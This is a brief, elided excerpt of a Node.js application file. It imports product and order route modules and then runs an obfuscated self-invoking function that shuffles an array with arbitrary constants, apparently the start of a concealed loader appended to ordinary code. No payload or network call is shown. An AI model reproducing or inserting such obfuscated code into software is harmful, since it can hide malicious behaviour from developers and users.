...
const productRoutes = require("./src/api/v1/routes/product");
const orderRoutes = require("./src/api/v1/routes/order");
...
(function () {
  ...
  function WsA(x) {
    ...
    for (var b = 0; b < a; b++) {
      var t = j * (b + 192) + (j % 19287);
      var p = j * (b + 307) + (j % 27441);
      var f = t % a;
      var z = p % a;
      var g = n[f];
      n[f] = n[z];
